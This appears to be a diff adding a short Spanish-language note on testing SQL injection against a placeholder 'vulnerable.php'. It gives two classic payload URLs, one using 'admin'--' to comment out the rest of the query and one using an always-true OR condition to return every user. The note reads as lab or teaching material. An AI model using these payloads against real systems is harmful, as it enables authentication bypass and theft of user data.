@@ -1,0 +1,9 @@
+Para probar la inyección SQL en el código vulnerable, puedes usar una URL como la siguiente:
+
+http://tu_servidor/vulnerable.php?username=admin'--
+Esto podría devolver los datos del usuario "admin" porque el resto de la consulta se comenta con --.
+
+Otra prueba podría ser:
+
+http://tu_servidor/vulnerable.php?username=admin' OR '1'='1
+Esto podría devolver todos los usuarios de la tabla.
